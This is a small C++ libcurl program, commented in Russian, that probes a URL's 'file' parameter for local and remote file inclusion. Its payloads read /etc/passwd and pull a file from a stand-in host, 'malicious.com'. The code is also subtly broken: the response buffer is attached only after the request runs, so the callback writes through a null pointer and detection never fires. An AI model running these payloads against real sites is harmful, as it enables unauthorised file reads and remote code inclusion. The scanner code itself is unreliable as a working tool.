#include <iostream>
#include <string>
#include <curl/curl.h>
#include <curl/easy.h>

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    size_t totalSize = size * nmemb;
    userp->append((char*)contents, totalSize);
    return totalSize;
}

void check_vulnerability(const std::string& url, const std::string& payload) {
    CURL* curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        std::string full_url = url + "?file=" + payload; // Предполагается, что параметр называется "file"
        curl_easy_setopt(curl, CURLOPT_URL, full_url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

        // Выполняем запрос
        res = curl_easy_perform(curl);
        
        // Проверяем результат
        if(res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        } else {
            std::string response;
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            std::cout << "Response: " << response << std::endl;

            // Здесь можно добавить логику для анализа ответа на наличие признаков уязвимости
            if (response.find("root:") != std::string::npos) { // Пример простого анализа
                std::cout << "Potential LFI/RFI vulnerability found with payload: " << payload << std::endl;
            }
        }

        // Освобождаем ресурсы
        curl_easy_cleanup(curl);
    }
}

int main() {
    std::string target_url;
    std::cout << "Enter target URL (e.g., http://example.com/vulnerable.php): ";
    std::cin >> target_url;

    // Список полезных нагрузок для проверки
    std::string payloads[] = {
        "../etc/passwd",
        "http://malicious.com/malicious_file.txt" // Пример для RFI
    };

    for (const auto& payload : payloads) {
        check_vulnerability(target_url, payload);
    }

    return 0;
}